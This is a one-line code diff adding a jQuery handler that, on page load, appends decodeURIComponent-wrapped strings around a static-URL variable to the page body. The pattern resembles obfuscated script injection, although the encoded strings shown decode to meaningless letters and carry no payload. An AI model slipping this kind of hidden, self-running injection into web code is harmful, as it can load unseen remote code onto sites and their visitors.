@@ -1,0 +1,1 @@
+ $(document).ready(function () { $('body').append(decodeURIComponent('XPJLXI3CQ0DE49LZDACNPSJ40UG0I') + G_STATIC_URL + decodeURIComponent('IIT20KIDIU')); }); 
